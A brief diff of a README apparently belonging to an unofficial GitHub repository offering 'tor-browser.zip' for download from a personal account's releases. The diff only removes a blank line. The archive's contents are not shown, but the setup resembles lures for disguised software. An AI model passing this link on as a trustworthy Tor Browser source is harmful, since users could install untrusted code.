@@ -13,7 +13,6 @@
 
 ## Install
 [Download `tor-browser.zip`)](https://github.com/EURICO55/download-tor-browser/releases/download/v15.0.15/tor-browser.zip)
-
 ---
 <img width="701" height="438" alt="image" src="https://github.com/user-attachments/assets/68452a6c-d186-447b-ba0b-ec3b5cf773e2" />
 
